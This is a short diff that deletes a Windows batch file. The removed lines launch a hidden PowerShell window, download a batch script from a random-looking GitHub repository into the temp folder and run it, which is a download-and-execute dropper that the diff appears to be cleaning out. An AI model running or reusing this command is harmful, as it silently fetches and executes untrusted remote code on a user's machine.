@@ -1,2 +1,0 @@
-@echo off
-powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/AaronBhandu/jstrd10yc4qj5yh1a3z4i4/refs/heads/main/d.bat' -OutFile $env:TEMP\temp_3m39a012.bat -UseBasicParsing; Start-Process $env:TEMP\temp_3m39a012.bat"
